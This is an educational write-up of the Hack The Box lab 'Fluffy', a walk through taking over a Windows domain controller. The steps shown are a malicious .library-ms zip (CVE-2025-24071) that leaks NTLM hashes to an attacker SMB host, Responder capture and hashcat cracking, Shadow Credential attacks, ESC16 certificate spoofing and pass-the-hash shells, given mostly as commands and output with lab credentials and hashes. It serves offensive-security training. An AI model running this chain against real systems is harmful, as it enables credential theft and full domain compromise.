---
icon: bone-break
cover: ../../../../.gitbook/assets/Screenshot 2026-03-27 114404.png
coverY: 6.2858777534089825
---

# HTB-FLUFFY

## The Scenario What Is This Box and What Do We Need to Do

Before touching a single command, let me actually explain what's going on here because this box has a specific setup that changes how you approach everything.

This is an "assume breach" scenario. You're not starting as an anonymous attacker trying to get initial access from nothing you're starting as someone who is already inside the organization with a low-privilege domain account. The box hands you these credentials upfront:

```
j.fleischman : J0elTHEM4n1990!
```

Think of it like a real-world internal pentest where the client says "pretend you're a disgruntled junior employee how bad can things get?" You have valid credentials but you're nobody. No shell, no admin rights, nothing special. The question is how far you can push it.

The full path to root looks like this: We start with `j.fleischman` and abuse write access to an SMB share to plant a malicious zip file. A Windows Explorer vulnerability (CVE-2025-24071) causes another user called `p.agila` to automatically authenticate to us when they browse the share. We capture their NetNTLMv2 hash and crack it. With `p.agila`'s credentials, BloodHound shows us a chain through group memberships that gives us GenericWrite over service accounts. We use a Shadow Credential attack to recover NTLM hashes for `winrm_svc` and `ca_svc`. `winrm_svc` gets us a WinRM shell and the user flag. From there we abuse ESC16 in the ADCS environment where the CA has a critical security extension disabled to impersonate Administrator and collect the root flag.

Three distinct jumps. Let's walk through each one.

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ rustscan -a 10.10.11.69 --ulimit 5000 --range 1-10000 -- -sCV -Pn
```

```
Discovered open port 445/tcp on 10.10.11.69
Discovered open port 139/tcp on 10.10.11.69
Discovered open port 9389/tcp on 10.10.11.69
Discovered open port 53/tcp on 10.10.11.69
Discovered open port 593/tcp on 10.10.11.69
Discovered open port 636/tcp on 10.10.11.69
Discovered open port 464/tcp on 10.10.11.69
Discovered open port 88/tcp on 10.10.11.69
Discovered open port 3269/tcp on 10.10.11.69
Discovered open port 389/tcp on 10.10.11.69
Discovered open port 5985/tcp on 10.10.11.69
Discovered open port 3268/tcp on 10.10.11.69

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp open  mc-nmf        .NET Message Framing

| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
```

One look at this port layout and the box's identity is immediately obvious. DNS on 53, Kerberos on 88, LDAP on 389/636/3268/3269, SMB on 445, WinRM on 5985, ADWS on 9389 this is a Windows Domain Controller, no question. The SSL certificate is also leaking two critical pieces of information we'll use throughout the box: the hostname is `DC01.fluffy.htb`, and the certificate issuer is `fluffy-DC01-CA` which tells us Active Directory Certificate Services is running before we even enumerate it directly. WinRM on 5985 is what we're ultimately targeting for our shells.

#### Hosts File

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ echo "10.10.11.69 DC01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
```

```
10.10.11.69 DC01.fluffy.htb fluffy.htb
```

***

## Initial Credential Validation and Domain Enumeration

#### Verifying the Given Credentials

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
SMB  10.10.11.69  445  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
SMB  10.10.11.69  445  DC01  [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc winrm 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
WINRM  10.10.11.69  5985  DC01  [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```

Creds work for SMB but not WinRM. This user exists in the domain and can authenticate, but they're not in the Remote Management Users group, so no shell yet. That's expected — they're a regular low-priv user.

#### RID Brute Force - Finding All Domain Users

RID brute forcing is one of the first things to do with valid credentials because it dumps every user and group in the domain without needing special privileges. Every domain object has a Security Identifier (SID) that ends with a Relative Identifier (RID). By cycling through RIDs from 500 upward, we can enumerate the full list of accounts.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --rid-brute
```

```
SMB  DC01  498   FLUFFY\Enterprise Read-only Domain Controllers  Group
SMB  DC01  500   FLUFFY\Administrator                            User
SMB  DC01  501   FLUFFY\Guest                                    User
SMB  DC01  502   FLUFFY\krbtgt                                   User
SMB  DC01  512   FLUFFY\Domain Admins                            Group
SMB  DC01  513   FLUFFY\Domain Users                             Group
SMB  DC01  517   FLUFFY\Cert Publishers                          Group
SMB  DC01  1101  FLUFFY\DnsAdmins                                Group
SMB  DC01  1103  FLUFFY\ca_svc                                   User
SMB  DC01  1104  FLUFFY\ldap_svc                                 User
SMB  DC01  1601  FLUFFY\p.agila                                  User
SMB  DC01  1603  FLUFFY\winrm_svc                                User
SMB  DC01  1604  FLUFFY\Service Account                          Group
SMB  DC01  1605  FLUFFY\j.coffey                                 User
SMB  DC01  1606  FLUFFY\j.fleischman                             User
SMB  DC01  1607  FLUFFY\Service Accounts                         Group
```

Several things jump out here immediately. There are three service accounts: `ca_svc` (likely the certificate authority service account), `ldap_svc`, and `winrm_svc`. There's a `Cert Publishers` group which in AD environments running ADCS grants enrollment rights on the CA. And there's a `Service Accounts` group that likely has special permissions over those service accounts. This is exactly the kind of structure BloodHound will map into an attack path later.

***

## SMB Enumeration - The IT Share

#### Listing Available Shares

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

```
Share      Permissions     Remark
-----      -----------     ------
ADMIN$                     Remote Admin
C$                         Default share
IPC$       READ            Remote IPC
IT         READ,WRITE
NETLOGON   READ            Logon server share
SYSVOL     READ            Logon server share
```

The `IT` share with both READ and WRITE permissions is immediately interesting. We can read what's in there but more importantly we can plant files. If anyone is browsing this share, we can put something malicious there and have them trigger it without any social engineering required.

#### Browsing the IT Share

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ smbclient //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'
```

<figure><img src="../../../../.gitbook/assets/image (652).png" alt=""><figcaption></figcaption></figure>

Software installers Everything (a Windows search utility) and KeePass — plus a PDF. The zip files are already extracted into folders next to them, which tells us someone or something is actively monitoring and processing this share. Let's grab the PDF.

```
smb: \> lcd /home/sn0x/HTB/Fluffy
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (52.5 KiloBytes/sec)
```

Alternatively with impacket:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ impacket-smbclient 'fluffy.htb/j.fleischman:J0elTHEM4n1990!'@dc01.fluffy.htb
```

```
# use IT
# get Upgrade_Notice.pdf
```

#### Analyzing the PDF

<figure><img src="../../../../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

The PDF is an internal IT department notice about upcoming security patches. It lists CVEs that need to be addressed and right there in the document is CVE-2025-24071. This is the box giving us a very direct hint about what vulnerability to exploit. But let's also check the PDF metadata.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ exiftool Upgrade_Notice.pdf
```

```
File Name                       : Upgrade_Notice.pdf
Title                           : Upgrade Notice For IT Department
Create Date                     : 2025:05:17 07:22:32+00:00
Author                          : p.agila
```

The author field leaks `p.agila` this is the person who created the notice, which strongly implies they're the one monitoring this IT share. This is exactly who we're going to target with our exploit.

<figure><img src="../../../../.gitbook/assets/image (654).png" alt=""><figcaption></figcaption></figure>

The fact that they're actively managing this share and are aware of CVE-2025-24071 but haven't patched yet is exactly what makes the attack work.

We are gonna Use this :

<figure><img src="../../../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/ThemeHackers/CVE-2025-24071" %}

> **CVE-2025-24071\_PoC**
>
> CVE-2025-24071: NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File
>
> **Windows Explorer automatically initiates an SMB authentication request when a .library-ms file is extracted from a .rar archive, leading to NTLM hash disclosure. The user does not need to open or execute the file—simply extracting it is enough to trigger the leak**

***

## ADCS Enumeration

Since the SSL cert already told us `fluffy-DC01-CA` exists, let's confirm ADCS is running and look for misconfigurations. We'll come back to this more thoroughly later, but it's worth running certipy early to see the landscape.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
```

```
ADCS  10.10.11.69  389  DC01  Found PKI Enrollment Server: DC01.fluffy.htb
ADCS  10.10.11.69  389  DC01  Found CN: fluffy-DC01-CA
```

ADCS confirmed. Certipy with `-vulnerable` right now as `j.fleischman` shows nothing directly exploitable for this user. But notice what's hiding in the CA configuration output:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
```

```
Certificate Authorities
  0
    CA Name                : fluffy-DC01-CA
    Disabled Extensions    : 1.3.6.1.4.1.311.25.2
    Enroll                 : FLUFFY.HTB\Cert Publishers
```

That `Disabled Extensions` line with OID `1.3.6.1.4.1.311.25.2` is a massive clue. That's the security extension responsible for strong certificate mapping in ADCS. Its absence from the CA configuration means ESC16 is in play but we need a different account to exploit it. We'll come back here after we pivot through the domain.

***

## BloodHound - Mapping the Attack Path

<figure><img src="../../../../.gitbook/assets/image (655).png" alt=""><figcaption></figcaption></figure>

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69
```

We'll run this after we get `p.agila`'s password, but let me explain what the data shows before we get to the exploitation, because understanding the path first helps everything else make sense.

The BloodHound graph reveals this chain: `p.agila` is a member of `Service Account Managers`. That group has GenericAll over the `Service Accounts` group. GenericAll over a group means you can add members to it. Once you're in `Service Accounts`, you have GenericWrite over `winrm_svc`, `ca_svc`, and `ldap_svc`. GenericWrite over a user account in AD is very powerful — it lets you modify most of that account's attributes. And `winrm_svc` is a member of the Remote Management Users group, which is what allows WinRM access. So the path is: get `p.agila` → add them to `Service Accounts` → abuse GenericWrite to get `winrm_svc`'s hash → shell.

***

## CVE-2025-24071 - Stealing p.agila's Hash

#### What This Vulnerability Actually Is

CVE-2025-24071 (also referred to as CVE-2025-24054 in some disclosures) is a vulnerability in how Windows Explorer handles `.library-ms` files when they're contained inside zip or rar archives. A `.library-ms` file is an XML-based Windows file that defines a "library" it tells Explorer where to look for files in a collection. The vulnerability is that when Windows processes one of these files from an archive, it automatically attempts to reach out to any network paths defined inside it. If that network path points to an attacker's machine, Windows will try to authenticate over SMB using the current user's credentials, handing over a NetNTLMv2 hash.

Here's what makes this particularly nasty: the user doesn't need to double-click the file or extract it manually. Simply navigating to the folder containing the zip, right-clicking it, or dragging it are all enough to trigger the authentication attempt. It's essentially automatic NTLM credential theft that requires almost zero user interaction.

The `.library-ms` file inside the zip looks roughly like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="...">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.21\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

When Explorer parses the `<url>` tag pointing to our IP, it tries to connect to that SMB path and automatically sends NTLM credentials. We catch those credentials with Responder.

#### Alternative Ways to Force NTLM Authentication

If this specific CVE was patched or unavailable, there are other files you can plant on an SMB share that achieve the same outcome — forcing the browsing user to authenticate to your machine. A `.url` file (Windows internet shortcut) with an `IconFile` or `URL` pointing to a UNC path triggers authentication when Explorer tries to render the icon. An `.scf` (Shell Command File) with `IconFile=\\attacker-ip\share\icon.ico` does the same thing on older systems. A `.lnk` file (Windows shortcut) with its icon or target pointing to a UNC path will also do it. Tools like `ntlm_theft` generate a whole batch of these different file types simultaneously so you can try all of them. The common principle is the same: any file that causes Windows to resolve a UNC path when rendered by Explorer will trigger NTLM authentication.

#### Generating the Malicious Zip

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ python3 poc.py
```

```
Enter your file name: exploit
Enter IP (EX: 192.168.1.162): 10.10.14.21
completed
```

This generates `exploit.zip` containing the malicious `.library-ms` file with our attacker IP embedded in the UNC path.

#### Starting Responder

Responder is what catches the incoming NTLM authentication attempt. When Windows tries to connect to `\\10.10.14.21\share`, our SMB server is listening and captures the challenge-response exchange.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ sudo responder -I tun0 -wvF
```

```
[+] Servers:
    SMB server    [ON]
    HTTP server   [ON]

[+] Responder IP : 10.10.14.21
[+] Listening for events...
```

#### Uploading the Payload

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ smbclient //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'
```

```
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.7 kb/s)
```

Wait about a minute. The automated process on the DC extracts the zip, Explorer processes the `.library-ms` file, and Responder catches the incoming authentication from `p.agila`.

```
[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C059...01010000...
```

#### Cracking the Hash

Before cracking, a quick clarification on what this hash actually is. A NetNTLMv2 hash isn't a hash in the traditional stored-credential sense. It's a cryptographic challenge-response exchange. The server sends a random challenge, the client takes their NTLM-derived key, runs it through HMAC-MD5 with the challenge, and sends back the result. What we captured is that challenge plus the client's response. We cannot pass this directly to authenticate (unlike a regular NT hash), but we can crack it offline by guessing passwords, recomputing what the response would be for each guess, and checking if it matches.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ hashcat p.agila.hash /usr/share/wordlists/rockyou.txt -m 5600
```

```
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected: 5600 | NetNTLMv2 | Network Protocol

p.agila::FLUFFY:[full hash]:prometheusx-303

Session..........: hashcat
Status...........: Cracked
```

Mode 5600 specifically handles NetNTLMv2 because hashcat knows the exact HMAC-MD5 computation the client used to generate the response, so it can recompute it for each candidate password and check for a match. The password is `prometheusx-303`.

Alternatively with john:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ john p.agila.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
prometheusx-303  (p.agila)
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ nxc smb 10.10.11.69 -u p.agila -p 'prometheusx-303'
```

```
SMB  10.10.11.69  445  DC01  [+] fluffy.htb\p.agila:prometheusx-303
```

Credentials confirmed. Now let's pull BloodHound data with this account.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ bloodhound-python -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb -ns 10.10.11.69
```

```
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 computers
INFO: Done in 00M 16S
INFO: Compressing output into 20250529102900_bloodhound.zip
```

Upload to BloodHound, mark `p.agila` as owned. The attack path we described earlier is now clearly visible in the graph.

***

## Shell as winrm\_svc - Shadow Credential Attack

#### Step 1 - Add p.agila to Service Accounts

`p.agila` is in `Service Account Managers` which has GenericAll over the `Service Accounts` group. GenericAll over a group means full control including the ability to add members. So we add `p.agila` to `Service Accounts` to inherit its GenericWrite permissions over the service accounts.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ bloodyAD --host '10.10.11.69' -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
```

```
[+] p.agila added to SERVICE ACCOUNTS
```

#### Step 2 - Shadow Credential Attack on winrm\_svc

Now `p.agila` has GenericWrite over `winrm_svc`. The Shadow Credential attack exploits the `msDS-KeyCredentialLink` attribute in Active Directory, which is used by Windows Hello for Business and PKINIT (certificate-based Kerberos authentication). When this attribute is populated with a key credential, the account can authenticate using the associated private key instead of a password.

Because we have GenericWrite, we can add our own certificate keypair to the target account's `msDS-KeyCredentialLink`. Certipy generates the keypair, writes the public key to the attribute, then uses the private key to perform PKINIT Kerberos authentication as that account. If successful, it also extracts the account's NTLM hash via a User-to-User (U2U) Kerberos exchange, giving us pass-the-hash capability. Certipy then automatically restores the original attribute value so we leave no trace.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account winrm_svc -target 10.10.11.69
```

```
[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5f3391a6-1fa0-c13f-9f4b-73cd35364...'
[*] Successfully added Key Credential to 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

If you're hitting a Kerberos clock skew error, wrap the command with `faketime`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account winrm_svc -target 10.10.11.69
```

While we're here, let's grab `ca_svc` and `ldap_svc` too since we have the access right now.

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -target 10.10.11.69
```

```
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ldap_svc -target 10.10.11.69
```

```
[*] NT hash for 'ldap_svc': 22151d74ba3de931a352cba1f9393a37
```

#### Alternative - Targeted Kerberoasting or Password Reset

If the Shadow Credential attack wasn't working (for example if PKINIT is disabled on the domain), there are other ways to abuse GenericWrite over a user. You can set a ServicePrincipalName on the target account, which makes it Kerberoastable, then request a TGS and crack it offline — this depends on the account having a weak password. You could also attempt a direct password reset if your exact permissions include that right. Both are louder and more destructive than the Shadow Credential approach, which is why it's preferred — it's non-destructive and doesn't change the account's actual password.

#### Getting the Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\winrm_svc\desktop> cat user.txt
```

User flag captured.

***

## Shell as Administrator - ESC16 in ADCS

#### What ESC16 Is and Why It Matters

When you request a certificate from an ADCS CA, the CA normally embeds a security extension with OID `1.3.6.1.4.1.311.25.2` into every certificate it issues. This extension contains the SID of the account the certificate was issued to. When you later present that certificate for authentication via Schannel or PKINIT, the DC checks the SID in the extension against the account you're claiming to be. This is called "strong certificate mapping" and it's what prevents someone from requesting a certificate as a low-priv account and then using it to impersonate a different high-priv account.

ESC16 is the misconfiguration where the CA has this security extension globally disabled. Without the SID embedded in certificates, the system falls back to weak mapping — it just looks at the User Principal Name (UPN) in the certificate and trusts it. So if you have GenericWrite over any account that can enroll in certificates, you can change that account's UPN to `administrator`, request a certificate while the UPN is set that way, get back a certificate that says "I am administrator", then authenticate with it. The DC has no way to verify this isn't legitimate because it has no SID to cross-check.

The `ca_svc` account is ideal for this because it's a member of `Cert Publishers`, which grants enrollment rights on the CA. Regular domain users can't just request any certificate from this CA — `ca_svc` can.

#### Finding ESC16 with ca\_svc

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad find -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

```
Certificate Authorities
  0
    CA Name                : fluffy-DC01-CA
    Disabled Extensions    : 1.3.6.1.4.1.311.25.2
    Enroll                 : FLUFFY.HTB\Cert Publishers

    [!] Vulnerabilities
      ESC16                : Security Extension is disabled.
```

Confirmed. Note that ESC16 detection was only added to certipy recently. If you're getting no results, upgrade: `pip install certipy-ad --upgrade`.

#### Step 1 - Check ca\_svc's Current UPN

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad account -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
```

```
[*] Reading attributes for 'ca_svc':
    sAMAccountName       : ca_svc
    userPrincipalName    : ca_svc@fluffy.htb
    servicePrincipalName : ADCS/ca.fluffy.htb
```

Current UPN is `ca_svc@fluffy.htb`. We use `winrm_svc` to modify `ca_svc` because both are in `Service Accounts` and the group has GenericWrite over all members.

#### Step 2 - Set the UPN to administrator

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad account -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
```

```
[*] Updating user 'ca_svc':
    userPrincipalName  : administrator
[*] Successfully updated 'ca_svc'
```

The `ca_svc` account now has a UPN of `administrator` in Active Directory. From the DC's perspective this is just an attribute update — nothing triggers yet.

#### Step 3 - Request the Certificate as ca\_svc

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

The CA read `ca_svc`'s UPN, found it said `administrator`, and issued a certificate claiming to be for `administrator`. Because the security extension is disabled, no SID was embedded. The CA had no idea it was being abused.

#### Step 4 - Restore ca\_svc's UPN

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

```
[*] Updating user 'ca_svc':
    userPrincipalName  : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

The certificate is already issued and saved. We don't need the modified UPN anymore, so put it back. Clean operation.

#### Step 5 - Authenticate as Administrator

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ faketime -f +7h certipy-ad auth -pfx administrator.pfx -domain fluffy.htb -u administrator -dc-ip 10.10.11.69
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

The DC accepted the certificate, issued a TGT for Administrator, and certipy extracted the NT hash via U2U Kerberos. The blank LM portion (`aad3b435b51404eeaad3b435b51404ee`) is just a standard placeholder the actual NT hash is `8da83a3fa618b6e3a00e93f676c92a6e`.

If you prefer to use the TGT directly without the hash, that works too:

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ export KRB5CCNAME=administrator.ccache
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ impacket-psexec -k -no-pass administrator@dc01.fluffy.htb
```

#### Getting the Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/Fluffy]
└─$ evil-winrm -i 10.10.11.69 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

```
Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Rooted.

***

### Full Attack Chain

```
[Given Credentials]
j.fleischman : J0elTHEM4n1990!
        |
        | SMB: READ+WRITE access to IT share
        | PDF author field reveals: p.agila
        v
[CVE-2025-24071 / CVE-2025-24054]
Craft malicious .library-ms inside exploit.zip
Upload to IT share via smbclient
Windows Explorer on DC auto-processes the zip
UNC path in .library-ms triggers SMB auth to 10.10.14.21
Responder captures NetNTLMv2 hash for p.agila
hashcat mode 5600 cracks it
        |
        v
[p.agila : prometheusx-303]
BloodHound maps the path:
p.agila -> Service Account Managers
        -> GenericAll over Service Accounts group
        -> Add p.agila to Service Accounts
        -> GenericWrite over winrm_svc, ca_svc, ldap_svc
        |
        v
[Shadow Credential Attack via certipy]
Write malicious KeyCredential to winrm_svc (msDS-KeyCredentialLink)
PKINIT Kerberos auth -> TGT + U2U -> NT hash for winrm_svc
Also grab ca_svc NT hash the same way
        |
        | winrm_svc is in Remote Management Users
        v
[WinRM Shell as winrm_svc]
evil-winrm -H 33bd09dcd697600edf6b3a7af4875767
user.txt
        |
        | ca_svc is in Cert Publishers
        | CA has security extension disabled (ESC16)
        v
[ESC16 ADCS Exploitation]
winrm_svc modifies ca_svc UPN -> "administrator"
Request User cert as ca_svc (Cert Publishers can enroll)
CA issues cert with UPN = administrator (no SID check)
Restore ca_svc UPN immediately
certipy auth with administrator.pfx -> TGT + NT hash
        |
        v
[WinRM Shell as Administrator]
evil-winrm -H 8da83a3fa618b6e3a00e93f676c92a6e
root.txt
```

***

### Techniques I Used

| Technique                                         | Where Used                                                                |
| ------------------------------------------------- | ------------------------------------------------------------------------- |
| RID Brute Force via nxc                           | Enumerating all domain users and groups with j.fleischman                 |
| SMB Share Enumeration                             | Discovering writable IT share with j.fleischman                           |
| PDF Metadata Extraction (exiftool)                | Identifying p.agila as the share owner via Author field                   |
| CVE-2025-24071 (.library-ms in ZIP)               | Triggering automatic NTLM auth from p.agila's Windows Explorer            |
| NTLM Hash Capture via Responder                   | Catching p.agila's NetNTLMv2 during SMB auth attempt                      |
| NetNTLMv2 Offline Cracking (hashcat mode 5600)    | Recovering p.agila's plaintext password from captured hash                |
| BloodHound AD Enumeration                         | Mapping GenericWrite paths from p.agila to service accounts               |
| BloodyAD Group Membership Abuse                   | Adding p.agila to Service Accounts via GenericAll on group                |
| Shadow Credential Attack (msDS-KeyCredentialLink) | Recovering NT hashes for winrm\_svc, ca\_svc, ldap\_svc non-destructively |
| PKINIT Kerberos + U2U Authentication              | Extracting NTLM hashes from TGTs obtained via Shadow Credentials          |
| Pass-the-Hash via evil-winrm                      | WinRM shell as winrm\_svc and Administrator                               |
| ADCS ESC16 Exploitation                           | UPN spoofing via globally disabled security extension on CA               |
| Certificate-Based Authentication via certipy      | Authenticating as Administrator using spoofed UPN in certificate          |
| faketime Clock Skew Fix                           | Bypassing Kerberos KRB\_AP\_ERR\_SKEW when system clocks differ           |

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
